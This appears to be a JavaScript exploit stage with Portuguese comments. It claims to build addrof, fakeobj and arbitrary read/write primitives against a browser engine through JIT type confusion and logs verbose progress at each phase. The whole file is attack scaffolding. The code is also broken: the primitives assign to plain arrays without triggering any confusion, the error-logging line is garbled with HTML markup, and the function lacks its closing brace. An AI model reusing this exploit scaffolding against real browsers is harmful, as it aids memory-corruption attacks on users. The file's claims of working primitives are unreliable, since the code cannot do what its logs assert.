// js/script3/testArrayBufferVictimCrash.mjs (v118 - Validação com Logs Verbosos)
// =======================================================================================
// LOG DE ALTERAÇÕES:
// - ADICIONADO: Logs de depuração verbosos em todas as fases do exploit para fornecer
//   uma visão detalhada do fluxo de execução.
// - FOCO: Validar o comportamento interno das primitivas addrof, fakeobj, arb_read e
//   arb_write antes de prosseguir para o vazamento da base da biblioteca.
// - A lógica funcional do exploit v117 permanece inalterada.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';

export const FNAME_MODULE_FINAL = "Uncaged_v118_Verbose_Validation";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Validação com Logs Verbosos ---`, "test");

    let final_result = { success: false, message: "A cadeia de exploração falhou." };

    try {
        // --- FASE 1: Estabelecer Primitivas 'addrof' e 'fakeobj' via JIT-Confusion ---
        logS3("--- FASE 1: Configurando primitivas via JIT Type Confusion... ---", "subtest");

        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];

        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' criadas.", "good");

        // --- FASE 2: Construir Primitivas de Leitura/Escrita Arbitrária ---
        logS3("--- FASE 2: Construindo L/E arbitrária... ---", "subtest");
        const leaker_obj = { obj_prop: null, val_prop: 0 };
        const leaker_addr = addrof(leaker_obj);
        // #VERBOSE
        logS3(`  [VERBOSE] Endereço do leaker_obj (via addrof): ${toHex(leaker_addr)}`, "debug");

        const leaker_obj_prop_addr = new AdvancedInt64(leaker_addr.low() + 0x10, leaker_addr.high());
        // #VERBOSE
        logS3(`  [VERBOSE] Endereço calculado da propriedade 'obj_prop': ${toHex(leaker_obj_prop_addr)}`, "debug");

        const arb_read = (addr) => {
            // #VERBOSE
            logS3(`  [arb_read] Lendo de: ${toHex(addr)}`, 'debug');
            const fake = fakeobj(addr);
            // #VERBOSE
            logS3(`  [arb_read] Objeto falso criado apontando para o endereço.`, 'debug');
            leaker_obj.obj_prop = fake;
            const val_as_double = leaker_obj.val_prop;
            // #VERBOSE
            logS3(`  [arb_read] Valor lido como double: ${val_as_double}`, 'debug');
            return doubleToInt64(val_as_double);
        };
        
        const arb_write = (addr, value) => {
            // #VERBOSE
            logS3(`  [arb_write] Escrevendo em: ${toHex(addr)}`, 'debug');
            const fake = fakeobj(addr);
            // #VERBOSE
            logS3(`  [arb_write] Objeto falso criado apontando para o endereço.`, 'debug');
            leaker_obj.obj_prop = fake;
            leaker_obj.val_prop = int64ToDouble(value);
            // #VERBOSE
            logS3(`  [arb_write] Valor ${toHex(value)} escrito.`, 'debug');
        };
        logS3("Primitivas de L/E arbitrária construídas.", "good");

        // --- FASE 3: Verificação Funcional ---
        logS3("--- FASE 3: Verificando a funcionalidade de L/E... ---", "subtest");
        const test_obj = { prop_a: 0xDEADBEEF, prop_b: 0xCAFEBABE };
        const test_obj_addr = addrof(test_obj);
        const prop_a_addr = new AdvancedInt64(test_obj_addr.low() + 0x10, test_obj_addr.high());
        logS3(`Endereço alvo da propriedade 'a': ${toHex(prop_a_addr)}`, "info");
        
        const value_to_write = new AdvancedInt64(0x11223344, 0x55667788);
        logS3(`Escrevendo o valor de teste: ${toHex(value_to_write)}`, "info");
        arb_write(prop_a_addr, value_to_write);

        const value_read = arb_read(prop_a_addr);
        logS3(`Valor lido de volta do endereço: ${toHex(value_read)}`, "leak");

        if (value_read.equals(value_to_write)) {
            logS3("++++++++ SUCESSO! A verificação de L/E foi bem-sucedida! Primitivas 100% funcionais. ++++++++", "vuln");
            final_result = {
                success: true,
                message: "Leitura/Escrita arbitrária confirmada através da vulnerabilidade de JIT Type Confusion."
            };
        } else {
            throw new Error(`A verificação de L/E falhou. Escrito: ${toHex(value_to_write)}, Lido: ${toHex(value_read)}`);
        }

    } catch (e) {
        final_result.message = `Exceção crítica na implementação: ${e.message}`;
        logS3(`<span class="math-inline">\{final\_result\.message\}\\n</span>{e.stack || ''}`, "critical");
        console.error(e);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result
